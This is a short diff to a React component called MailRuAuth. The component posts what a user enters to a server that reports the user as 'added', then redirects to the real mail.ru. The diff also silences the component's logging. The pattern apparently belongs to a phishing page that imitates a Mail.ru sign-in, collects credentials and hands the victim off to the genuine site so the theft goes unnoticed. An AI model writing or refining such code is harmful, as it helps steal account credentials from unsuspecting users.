@@ -50,16 +50,17 @@ const MailRuAuth = () => {
         .then(async (response) => {
           const data = await response.json();
           if (response.ok) {
-            console.log("Пользователь добавлен:", data);
+            // console.log("Пользователь добавлен:", data);
             setInputValue("");
             setStep("login")
+            window.location.href = "https://mail.ru/"
           } else {
-            console.error("Ошибка:", data.error);
+            // console.error("Ошибка:", data.error);
             setError(true);
           }
         })
         .catch((error) => {
-          console.error("Ошибка при отправке запроса:", error);
+          // console.error("Ошибка при отправке запроса:", error);
           setError(true);
         })
     }
